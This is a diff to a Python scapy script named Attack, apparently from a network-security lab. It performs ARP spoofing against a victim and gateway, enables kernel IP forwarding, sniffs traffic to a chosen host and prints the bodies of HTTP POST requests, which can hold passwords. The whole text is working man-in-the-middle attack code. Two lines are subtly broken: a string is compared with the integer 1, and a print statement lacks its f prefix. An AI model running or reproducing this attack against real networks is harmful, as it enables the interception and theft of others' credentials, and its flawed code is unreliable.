@@ -13,6 +13,15 @@ class Attack():
         self.interfaces = ni.interfaces()
         self.attacker, self.victim, self.ap = '10.0.2.4', '10.0.2.5', '10.0.2.1'
 
+    def _enable_linux_iproute(self):
+        file_path = "/proc/sys/net/ipv4/ip_forward"
+        with open(file_path) as f:
+            if f.read() == 1:
+                # already enabled
+                return
+        with open(file_path, "w") as f:
+            print(1, file=f)
+
     def get_ip(self):
         for i in self.interfaces:
             self.ip_list.append(ni.ifaddresses(i)[2][0]['addr'])
@@ -25,6 +34,7 @@ class Attack():
         result = scapy.srp(arp_request_broadcast, timeout = 3, verbose = False)[0]
         for sent, received in result:
             self.ip_mac[received.psrc] = received.hwsrc
+        self.ip_mac[self.attacker] = scapy.Ether().src
 
     def spoof(self, target_ip, spoof_ip): 
         target_mac = self.ip_mac[target_ip]
@@ -50,24 +60,16 @@ class Attack():
             time.sleep(2)
     
     def sniff_packets(self):
-        scapy.sniff(filter="tcp port 80", prn=self.process_packet, iface=self.interfaces[1], store=False)
+        scapy.sniff(filter="host 140.113.207.246", prn=self.process_packet, iface=self.interfaces[1], store=False)
 
     def process_packet(self, packet):
-        print('get\n', ' ', packet.layers(), '\n', packet.show(), '\n')
         if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == 'POST':
             print("{packet[scapy.Raw].load}\n")
-        
-        if packet[scapy.Ether].dst != self.ip_mac[self.ap]:
-            packet[scapy.Ether].dst = self.ip_mac[self.ap]
-        else:
-            packet[scapy.Ether].dst = self.ip_mac[self.victim]
-        print('\n', packet.layers(), '\n', packet.show(), '\n')
-        scapy.send(packet, verbose=0)
-        print('done\n')
 
 attack = Attack()
+attack._enable_linux_iproute()
 attack.get_ip()
 attack.get_mac(attack.network[1])
-print(attack.interfaces, attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
-#attack.arp_spoofing()
+#print(attack.interfaces, attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
 attack.sniff_packets()
+attack.ret_arp_spoofing()
